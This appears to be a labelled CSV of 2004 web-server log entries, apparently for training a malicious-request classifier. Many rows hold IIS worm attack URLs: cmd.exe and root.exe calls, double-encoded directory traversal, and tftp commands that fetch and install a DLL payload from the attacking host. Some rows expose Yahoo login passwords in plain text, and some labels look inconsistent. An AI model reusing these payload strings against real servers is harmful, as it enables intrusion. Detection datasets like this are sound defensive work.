,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
31,24.168.72.174,09/Mar/2004:22:19:33 -0500,http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_$$$$$$$&passwd=matthew ,200,566,"""-""",-,n,0,/config/login,8,without browser
32,68.48.142.117,09/Mar/2004:22:19:35 -0500,/scripts/root.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
33,192.117.242.67,09/Mar/2004:22:19:36 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
34,192.117.242.67,09/Mar/2004:22:19:41 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
35,68.48.142.117,09/Mar/2004:22:20:26 -0500,/scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
36,68.48.142.117,09/Mar/2004:22:20:26 -0500,/scripts/httpodbc.dll ,400,288,"""-""",-,m,1,/scripts/httpodbc.dll,0,without browser
37,68.48.142.117,09/Mar/2004:22:21:16 -0500,/MSADC/root.exe?/c+dir ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
38,218.93.92.137,09/Mar/2004:22:21:38 -0500,http://seekpond.com/search.php?username=johnbush&keywords=ads ,200,578,"""http://www.psend.com/users/mysearch/seekpond.htm""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
39,68.48.142.117,09/Mar/2004:22:22:07 -0500,/MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
40,68.48.142.117,09/Mar/2004:22:22:07 -0500,/MSADC/httpodbc.dll ,400,286,"""-""",-,n,0,/MSADC/httpodbc.dll,0,without browser
41,61.53.76.40,09/Mar/2004:22:22:13 -0500,http://69.59.175.60/found-best.com/search.php ,500,556,"""http://www.aprilgoldsgetpaid2reademail.com/pages/ptc.php""",Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
42,192.117.242.67,09/Mar/2004:22:22:33 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
43,68.48.142.117,09/Mar/2004:22:22:57 -0500,/c/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
44,61.172.244.109,09/Mar/2004:22:23:27 -0500,69.46.18.186:25 ,200,0,"""-""",-,n,0,69.46.18.186:25,0,without browser
45,68.48.142.117,09/Mar/2004:22:23:48 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
46,68.134.160.117,09/Mar/2004:22:24:27 -0500,http://www.glocksoft.net/cgi-bin/jenv.cgi ,200,1169,"""-""",Mozilla/4.0,n,0,/cgi-bin/jenv.cgi,0,without browser
47,68.48.142.117,09/Mar/2004:22:24:38 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
48,192.117.242.67,09/Mar/2004:22:24:44 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
49,192.117.242.67,09/Mar/2004:22:24:45 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
50,212.160.136.163,09/Mar/2004:22:24:57 -0500,http://www.xboss.us/search.php?str=online+gambling ,300,2,"""-""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0),n,0,/search.php,1,Microsoft Internet Explorer
51,212.160.136.163,09/Mar/2004:22:25:01 -0500,http://www.xboss.us/proxy.html ,200,1371,"""-""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0),n,0,/proxy.html,0,Microsoft Internet Explorer
52,68.48.142.117,09/Mar/2004:22:25:28 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
53,68.48.142.117,09/Mar/2004:22:25:28 -0500,/c/httpodbc.dll ,400,282,"""-""",-,n,0,/c/httpodbc.dll,0,without browser
54,218.93.92.137,09/Mar/2004:22:25:32 -0500,http://www.appliedsearch.net/Searchit?search&afID=2165&keywords=Program ,200,578,"""http://www.myshoppingpage.com/""",Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0,n,0,/Searchit,2,Netscape
55,203.121.182.139,09/Mar/2004:22:26:05 -0500,213.3.5.219:25 ,200,0,"""-""",-,n,0,213.3.5.219:25,0,without browser
56,68.48.142.117,09/Mar/2004:22:26:19 -0500,/d/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
57,68.48.142.117,09/Mar/2004:22:27:09 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
58,61.172.244.232,09/Mar/2004:22:27:29 -0500,61.137.101.4:25 ,200,0,"""-""",-,n,0,61.137.101.4:25,0,without browser
59,24.168.72.174,09/Mar/2004:22:27:46 -0500,http://sbc2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodusc&passwd=HELL ,200,566,"""-""",-,n,0,/config/login,8,without browser
60,68.48.142.117,09/Mar/2004:22:28:02 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
61,203.121.182.140,09/Mar/2004:22:28:44 -0500,209.15.20.87:25 ,200,0,"""-""",-,n,0,209.15.20.87:25,0,without browser
62,68.48.142.117,09/Mar/2004:22:28:53 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
63,68.48.142.117,09/Mar/2004:22:28:53 -0500,/d/httpodbc.dll ,400,282,"""-""",-,n,0,/d/httpodbc.dll,0,without browser
64,68.48.142.117,09/Mar/2004:22:29:43 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
65,192.117.242.67,09/Mar/2004:22:29:46 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
66,192.117.242.67,09/Mar/2004:22:29:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
67,220.173.17.142,09/Mar/2004:22:30:24 -0500,http://www.clickcheaper.com/search.php ,200,19044,"""http://www.163.net""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,0,Microsoft Internet Explorer
68,220.173.17.142,09/Mar/2004:22:30:26 -0500,http://clickcheaper.com/go.php?b=zhhhzzzizyzohchzhdzy&k=acasadsmayaoac&u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&s=axsssismazfp&t= ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/go.php,6,Microsoft Internet Explorer
69,220.173.17.142,09/Mar/2004:22:30:29 -0500,http://clickcheaper.com/go.php?u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&k=acasadsmayaoac&b=zhhhzzzizyzohchzhdzy&s=axsssismazfp&x=&t=&tw=&f=85e9b5a1ba9a613de01a0d3c470f76bb ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/go.php,6,Microsoft Internet Explorer
70,220.173.17.142,09/Mar/2004:22:30:30 -0500,http://www.epilot.com/click.aspx?k=cruises&b=820&p=kanoodle&s=seeky&pos=3&sid=ee77ec1d-5211-4508-a48f-27dcf3865349&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D77840372%26lid%3Dbhnnbinnbknobonkbmngbknjbonnbmni%26query%3Dcruises ,300,387,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/click.aspx,7,Microsoft Internet Explorer
71,220.173.17.142,09/Mar/2004:22:30:33 -0500,http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=77840372&lid=bhnnbinnbknobonkbmngbknjbonnbmni&query=cruises ,300,320,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/clickthrough.cool,5,Microsoft Internet Explorer
72,68.48.142.117,09/Mar/2004:22:30:34 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
73,220.173.17.142,09/Mar/2004:22:30:46 -0500,http://www.bestpricecruises.com/ ,200,44057,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
74,68.48.142.117,09/Mar/2004:22:31:24 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
75,217.136.205.206,09/Mar/2004:22:32:07 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://members.asstraffic.com:80""",Mozilla/4.7 ( compatible; [en]; Windows 95; win9x/NT 4.90 ),n,0,/secure/pages/index.php,0,without browser
76,68.48.142.117,09/Mar/2004:22:32:15 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
77,192.117.242.67,09/Mar/2004:22:32:39 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
78,68.48.142.117,09/Mar/2004:22:33:00 -0500,/scripts/root.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
79,68.48.142.117,09/Mar/2004:22:33:05 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
80,203.121.182.142,09/Mar/2004:22:33:17 -0500,219.88.69.100:25 ,200,0,"""-""",-,n,0,219.88.69.100:25,0,without browser
81,68.48.142.117,09/Mar/2004:22:33:50 -0500,/scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
82,68.48.142.117,09/Mar/2004:22:33:50 -0500,/scripts/httpodbc.dll ,400,288,"""-""",-,n,0,/scripts/httpodbc.dll,0,without browser
83,68.48.142.117,09/Mar/2004:22:33:55 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
84,68.48.142.117,09/Mar/2004:22:34:41 -0500,/MSADC/root.exe?/c+dir ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
85,68.48.142.117,09/Mar/2004:22:34:46 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
86,192.117.242.67,09/Mar/2004:22:34:47 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
